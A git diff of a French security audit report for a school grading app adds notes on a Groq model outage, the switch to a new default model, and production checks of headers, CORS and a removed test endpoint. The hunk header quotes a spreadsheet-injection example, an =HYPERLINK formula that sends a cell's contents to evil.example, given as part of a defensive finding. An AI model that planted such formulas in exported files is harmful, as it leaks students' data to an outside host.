@@ -148,7 +148,15 @@ Un étudiant nommé par exemple `=HYPERLINK("http://evil.example/steal?x="&A2,"c
 
 **Vérification :** suite backend `130 passed` (3 nouveaux tests : `email.service.test.js` ×2 pour l'échappement, 1 dans `grading.service.test.js` pour l'isolation du prompt). Test à chaud de l'app : préflight CORS depuis `https://miralamana.github.io` toujours accepté (204), en-têtes `X-Content-Type-Options: nosniff` / `Referrer-Policy: no-referrer` présents, `X-Powered-By` supprimé, `/api/ai/test` → 404, `/api/pdf/extract` → 429 à partir de la 21ᵉ requête.
 
-**Non vérifié :** le déploiement Render de ces changements (pas d'accès au dashboard) ; `helmet` n'a été testé que localement — à confirmer en ligne après déploiement (connexion + un export/aperçu de fichier).
+### Incident hors audit — modèle Groq inaccessible en production (2026-09-25)
+
+**Problème :** Groq renvoie `model_not_found` pour `llama-3.3-70b-versatile` (désormais classé « Enterprise ») : génération IA, import PDF et correction IA étaient inopérants en ligne. Constaté via l'ancien `/api/ai/test` de production, puis reproduit en local avec les vrais services.
+
+**Correctif :** modèle par défaut changé en `openai/gpt-oss-120b` dans [ai.service.js](backend/src/services/ai.service.js) (+ test, `.env.example`, README). Vérifié en local : `gradeAnswerWithAI` et `generateEvaluation` fonctionnent avec `openai/gpt-oss-120b` et `openai/gpt-oss-20b`. Sur Render, `GROQ_MODEL` doit aussi être défini (ou retiré) pour ne pas écraser ce défaut.
+
+**Point de vigilance :** ces modèles « raisonnent » et les tokens de raisonnement consomment le budget de sortie ; la correction IA plafonne à `maxTokens: 500` — à surveiller sur des réponses longues (réponse vide possible).
+
+**Vérifié en production (Render) après déploiement des constats 3 à 8 :** `/api/ai/test` → 404, `X-Powered-By` supprimé, en-têtes `helmet` présents, préflight CORS depuis GitHub Pages toujours accepté, connexion (401 sur faux compte) OK avec les en-têtes CORS. **Non vérifié en ligne :** l'aperçu de fichiers déposés et l'export CSV (nécessitent un compte enseignant et des données réelles).
 
 ---
 
